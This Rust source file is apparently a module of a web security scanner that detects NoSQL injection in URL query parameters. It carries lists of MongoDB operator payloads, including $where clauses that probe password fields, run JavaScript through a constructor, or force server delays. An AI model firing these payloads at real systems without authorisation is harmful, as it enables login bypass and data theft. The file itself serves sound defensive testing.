//! NoSQL Injection detection — MongoDB and other NoSQL databases.
//! Tests query-parameter injection points with MongoDB operators and
//! JSON body syntax, then checks for error, boolean-blind, and time-based signals.

use grym_core::{
    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
    TechniqueTier,
};
use regex::Regex;
use url::Url;

/// Error patterns that indicate a NoSQL database leaked an exception.
const NOSQL_ERROR_PATTERNS: &[&str] = &[
    r"(?i)MongoError",
    r"(?i)mongo.*(?:exception|error|fail|assert)",
    r"(?i)assertion.*(?:false|failed|error)",
    r"(?i)unexpected identifier",
    r"(?i)SyntaxError: Unexpected token",
    r"(?i)MongoDB.*(?:driver|connection|query)",
    r"(?i)CastError",
    r"(?i)ValidationError",
    r"(?i)MongooseError",
    r"(?i)BSONError",
    r"(?i)E11000 duplicate key",
    r"(?i)can't canonicalize query",
    r"(?i)BadValue",
    r"(?i)unknown operator",
    r"(?i)CouchDB.*(?:error|exception)",
    r"(?i)elasticsearch.*(?:error|exception)",
    r"(?i)QueryFailure",
    r"(?i)no such column",
    r"(?i)not authorized for query",
    r"(?i)OperationFailed",
    r"(?i)MongoServerError",
    r"(?i)MongoNetworkError",
    r"(?i)MongoBulkWriteError",
    r"(?i)MongoParseError",
    r"(?i)writeConcernError",
    r"(?i)query failed with error code",
    r"(?i)BSONObj size",
    r"(?i)Invalid BSON",
    r"(?i)Unrecognized field",
    r"(?i)Cannot deserialize",
    r"(?i)operation exceeded time limit",
    r"(?i)Failed to parse",
    r"(?i)unsupported operator",
    r"(?i)unrecognized operator",
    r"(?i)bad regex",
    r"(?i)invalid regular expression",
    r"(?i)TypeError",
    r"(?i)ReferenceError",
    r"(?i)Cannot read property",
    r"(?i)is not a function",
    r"(?i)querySrv",
    r"(?i)getaddrinfo",
    r"(?i)connection refused",
    r"(?i)timed out",
    r"(?i)Redis.*(?:exception|error)",
    r"(?i)CouchbaseError",
    r"(?i)ArangoDB",
    r"(?i)DatabaseException",
    r"(?i)cannot index parallel arrays",
    r"(?i)documentPath",
];

/// Boolean-based NoSQL payloads: (true_condition_payload, false_condition_payload).
const BOOLEAN_BLIND_PAYLOADS: &[(&str, &str)] = &[
    ("[$ne]=", "[$eq]=GRYM_NOSQLI_NONEXISTENT"),
    ("[$gt]=GRYM_NOSQLI_TRUE", "[$lt]=GRYM_NOSQLI_FALSE"),
    ("[$regex]=.*", "[$regex]=GRYM_NOSQLI_NOMATCH"),
    ("[$nin][]=GRYM_NOSQLI_NONEXISTENT", "[$nin][]=.*"),
    ("[$exists]=true", "[$exists]=false"),
    ("[$where]=1==1", "[$where]=1==2"),
    ("[$mod]=[1,0]", "[$mod]=[1,1]"),
    ("[$all][]=x", "[$all][]=GRYM_NOSQLI_NOMATCH"),
    (
        "[$elemMatch][$gt]=",
        "[$elemMatch][$lt]=GRYM_NOSQLI_NOMATCH",
    ),
    ("[$not][$eq]=GRYM_NOSQLI_NONEXISTENT", "[$not][$eq]=x"),
    ("[$regex]=^GRYM", "[$regex]=^GRYM_NOMATCH"),
    ("[$size]=0", "[$size]=99999"),
    ("[$exists]=true&[$ne]=x", "[$exists]=false"),
    (
        "[$where]=this.constructor.constructor(\"return true\")()",
        "[$where]=this.constructor.constructor(\"return false\")()",
    ),
];

/// NoSQL injection query-parameter payloads that exploit MongoDB operators.
const NOSQL_PAYLOADS: &[&str] = &[
    "[$ne]=1",
    "[$gt]=",
    "[$regex]=.*",
    "[$where]=1==1",
    "[$nin][]=1",
    "[$exists]=true",
    "[$ne]=null",
    "[$gt]=GRYM_NOSQLI_TRUE",
    "[$regex]=^.*$",
    "[$where]=sleep(5000)",
    "[$ne]=GRYM_NOSQLI_NONEXISTENT",
    "[$nin][]=",
    "[$exists]=false",
    "[$regex]=GRYM_NOSQLI",
    "[$where]=this.password.match(/.*/)",
    "[$gt]=0",
    "[$ne]=0",
    "[$regex]=.*.*",
    "[$nin][]=GRYM_NOSQLI_NONEXISTENT",
    "[$exists]=true&[$ne]=",
    "[$ne]=x",
    "[$gte]=",
    "[$lte]=",
    "[$lt]=",
    "[$in][]=",
    "[$all][]=x",
    "[$mod]=[1,0]",
    "[$size]=1",
    "[$type]=string",
    "[$regex]=^$",
    "[$where]=this.password.length>0",
    "[$where]=1==1",
    "[$ne]=undefined",
    "[$gt]=undefined",
    "[$regex]=.*.*.*",
    "[$nin][]=null",
    "[$exists]=true&[$nin][]=x",
    "[$func]=function(){}",
    "[$where]=sleep(3000)",
    "[$where]=this.constructor.constructor(\"return true\")()",
];

/// URL-encoded NoSQL payloads.
const URL_ENCODED_NOSQLI: &[&str] = &[
    "%5B%24ne%5D=1",
    "%5B%24gt%5D=",
    "%5B%24regex%5D=.*",
    "%5B%24where%5D=1%3D%3D1",
    "%5B%24nin%5D%5B%5D=1",
    "%5B%24exists%5D=true",
    "%5B%24ne%5D=null",
    "%5B%24regex%5D=%5E.*%24",
    "%5B%24gt%5D=0",
    "%5B%24ne%5D=x",
    "%5B%24gte%5D=",
    "%5B%24lte%5D=",
    "%5B%24lt%5D=",
    "%5B%24in%5D%5B%5D=",
    "%5B%24all%5D%5B%5D=x",
    "%5B%24mod%5D=%5B1%2C0%5D",
    "%5B%24size%5D=1",
    "%5B%24type%5D=string",
    "%5B%24regex%5D=%5E%24",
    "%5B%24where%5D=this.password.length%3E0",
    "%5B%24where%5D=1%3D%3D1",
    "%5B%24exists%5D=true%26%5B%24nin%5D%5B%5D=x",
    "%5B%24regex%5D=%5E(%3F%3Da.*).*%24",
    "%5B%24where%5D=sleep(3000)",
];

/// JSON‑style body syntax for NoSQL injection (used in query params for APIs
/// that parse JSON-encoded operators, e.g. `param={"$ne":1}`).
const JSON_SYNTAX_PAYLOADS: &[&str] = &[
    r#"={"$ne":1}"#,
    r#"={"$gt":""}"#,
    r#"={"$regex":".*"}"#,
    r#"={"$where":"1==1"}"#,
    r#"={"$nin":[1]}"#,
    r#"={"$exists":true}"#,
    r#"={"$ne":null}"#,
    r#"={"$gt":0}"#,
    r#"={"$regex":"^.*$"}"#,
    r#"={"$where":"sleep(5000)"}"#,
    r#"={"$ne":""}"#,
    r#"={"$ne":"x"}"#,
    r#"={"$gte":""}"#,
    r#"={"$lte":""}"#,
    r#"={"$in":[null]}"#,
    r#"={"$all":["x"]}"#,
    r#"={"$mod":[1,0]}"#,
    r#"={"$size":1}"#,
    r#"={"$type":"string"}"#,
    r#"={"$not":{"$eq":null}}"#,
    r#"={"$where":"this.password.length>0"}"#,
    r#"={"$where":"sleep(3000)"}"#,
    r#"={"$exists":true,"$ne":null}"#,
    r#"={"$regex":"^GRYM"}"#,
    r#"={"$ne":1,"$gt":0}"#,
];

/// Time‑based NoSQL payloads (rely on $where or $regex to cause observable
/// server-side delay — asynchronous clients won't block but latency deltas
/// can still be correlated).
const TIME_BASED_NOSQLI: &[&str] = &[
    "[$where]=sleep(5000)",
    "[$where]=this.sleep(5000)",
    "[$where]=new Date()%20&&%20sleep(5000)",
    "[$regex]=^(?=.*sleep(5000)).*$",
    "[$ne]=1&[$where]=sleep(5000)",
    "[$where]=sleep(3000)",
    "[$where]=sleep(7000)",
    "[$where]=1%3B%20sleep(5000)",
    "[$where]=this.constructor.constructor(\"return sleep(5000)\")()",
];

/// All URL parameters in a URL query string.
fn get_all_params(url: &Url) -> Vec<(String, String)> {
    url.query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect()
}

/// Injects a payload into one parameter while preserving others.
fn inject_payload(
    url: &Url,
    params: &[(String, String)],
    target_param: &str,
    payload: &str,
) -> Url {
    let mut test_url = url.clone();
    {
        let mut pairs = test_url.query_pairs_mut();
        pairs.clear();
        for (k, v) in params {
            let val = if k == target_param {
                payload.to_string()
            } else {
                v.clone()
            };
            pairs.append_pair(k, &val);
        }
    }
    test_url
}

/// Checks response body for a NoSQL error pattern match.
fn check_nosql_error(body: &str, _payload: &str, param_name: &str, url: &Url) -> Option<Finding> {
    for pattern in NOSQL_ERROR_PATTERNS {
        if let Ok(re) = Regex::new(pattern)
            && re.is_match(body)
        {
            return Some(Finding::new(
                format!(
                    "NoSQL Injection (error-based) in parameter '{}'",
                    param_name
                ),
                AssetRef {
                    identifier: url.to_string(),
                    kind: "web".into(),
                },
                Severity::Critical,
                Confidence::Confirmed,
                "grym-web-scanner",
            ));
        }
    }
    None
}

/// Checks if boolean-based NOSQL indicators appear (length or content difference).
fn check_boolean_indicators(
    hit_body: &str,
    miss_body: &str,
    hit_status: u16,
    miss_status: u16,
) -> bool {
    hit_status != miss_status
        || hit_body.len() != miss_body.len()
        || hit_body.contains("GRYM_NOSQLI_TRUE")
        || !miss_body.contains("GRYM_NOSQLI_TRUE")
}

pub async fn check_nosqli(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let base_query = get_all_params(url);

    if base_query.is_empty() {
        return Ok(findings);
    }

    for (param_name, _original_value) in &base_query {
        let mut param_findings = Vec::new();

        // Phase 1: Error-based detection
        for payload in NOSQL_PAYLOADS {
            let test_url = inject_payload(url, &base_query, param_name, payload);

            if let Ok(response) = client
                .get(
                    "grym-web-scanner",
                    test_url,
                    TechniqueTier::StandardDetection,
                )
                .await
                && let Some(finding) = check_nosql_error(&response.body, payload, param_name, url)
            {
                let mut f = finding;
                f.categories.push("A05:2025-Injection".into());
                f.cwe_ids.push(943);
                f.evidence.push(Evidence::redacted(
                    "nosqli-error-based",
                    format!("NoSQL error pattern matched with payload: {}", payload),
                    response.body.chars().take(200).collect::<String>(),
                ));
                f.remediation = "Use parameterized queries or input sanitisation for NoSQL databases. Validate and restrict operator usage.".into();
                f.references.push("https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection".into());
                param_findings.push(f);
                break;
            }
        }

        // Phase 2: URL-encoded error-based detection
        if param_findings.is_empty() {
            for payload in URL_ENCODED_NOSQLI {
                let test_url = inject_payload(url, &base_query, param_name, payload);

                if let Ok(response) = client
                    .get(
                        "grym-web-scanner",
                        test_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                    && let Some(finding) =
                        check_nosql_error(&response.body, payload, param_name, url)
                {
                    let mut f = finding;
                    f.categories.push("A05:2025-Injection".into());
                    f.cwe_ids.push(943);
                    f.evidence.push(Evidence::redacted(
                        "nosqli-encoded",
                        format!(
                            "NoSQL error pattern matched with URL-encoded payload: {}",
                            payload
                        ),
                        response.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation = "Use parameterized queries or input sanitisation for NoSQL databases. Validate and restrict operator usage.".into();
                    f.references.push("https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection".into());
                    param_findings.push(f);
                    break;
                }
            }
        }

        // Phase 3: JSON syntax payload detection
        if param_findings.is_empty() {
            for payload in JSON_SYNTAX_PAYLOADS {
                let test_url = inject_payload(url, &base_query, param_name, payload);

                if let Ok(response) = client
                    .get(
                        "grym-web-scanner",
                        test_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                    && let Some(finding) =
                        check_nosql_error(&response.body, payload, param_name, url)
                {
                    let mut f = finding;
                    f.categories.push("A05:2025-Injection".into());
                    f.cwe_ids.push(943);
                    f.evidence.push(Evidence::redacted(
                        "nosqli-json-syntax",
                        format!(
                            "NoSQL error pattern matched with JSON syntax payload: {}",
                            payload
                        ),
                        response.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation = "Use parameterized queries or input sanitisation for NoSQL databases. Validate and restrict operator usage.".into();
                    f.references.push("https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection".into());
                    param_findings.push(f);
                    break;
                }
            }
        }

        // Phase 4: Boolean-based blind detection
        if param_findings.is_empty() {
            for (true_payload, false_payload) in BOOLEAN_BLIND_PAYLOADS {
                let true_url = inject_payload(url, &base_query, param_name, true_payload);
                let false_url = inject_payload(url, &base_query, param_name, false_payload);

                let true_response = client
                    .get(
                        "grym-web-scanner",
                        true_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                    .ok();
                let false_response = client
                    .get(
                        "grym-web-scanner",
                        false_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                    .ok();

                if let (Some(tr), Some(fr)) = (true_response, false_response)
                    && check_boolean_indicators(&tr.body, &fr.body, tr.status, fr.status)
                {
                    let mut f = Finding::new(
                        format!(
                            "Boolean-based NoSQL Injection detected in parameter '{}'",
                            param_name
                        ),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::Critical,
                        Confidence::Likely,
                        "grym-web-scanner",
                    );
                    f.categories.push("A05:2025-Injection".into());
                    f.cwe_ids.push(943);
                    f.evidence.push(Evidence::redacted(
                        "nosqli-boolean",
                        "Boolean blind: true payload returned different content vs false payload",
                        tr.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation = "Use parameterized queries. Implement proper access controls and input validation.".into();
                    f.references.push("https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection".into());
                    param_findings.push(f);
                    break;
                }
            }
        }

        // Phase 5: Time-based blind detection
        if param_findings.is_empty() {
            for payload in TIME_BASED_NOSQLI {
                let test_url = inject_payload(url, &base_query, param_name, payload);
                let start = std::time::Instant::now();
                let response = client
                    .get(
                        "grym-web-scanner",
                        test_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                    .ok();
                let elapsed = start.elapsed().as_millis();

                if let Some(_r) = response
                    && elapsed > 2500
                {
                    let mut f = Finding::new(
                        format!(
                            "Time-based NoSQL Injection detected in parameter '{}'",
                            param_name
                        ),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::Critical,
                        Confidence::Confirmed,
                        "grym-web-scanner",
                    );
                    f.categories.push("A05:2025-Injection".into());
                    f.cwe_ids.push(943);
                    f.evidence.push(Evidence::redacted(
                        "nosqli-time",
                        format!("Time-based blind NoSQLi: payload took {}ms", elapsed),
                        format!("Payload: {}, Response time: {}ms", payload, elapsed),
                    ));
                    f.remediation = "Use parameterized queries with proper timeout handling and input validation.".into();
                    f.references.push("https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection".into());
                    param_findings.push(f);
                    break;
                }
            }
        }

        findings.extend(param_findings);
    }

    Ok(findings)
}
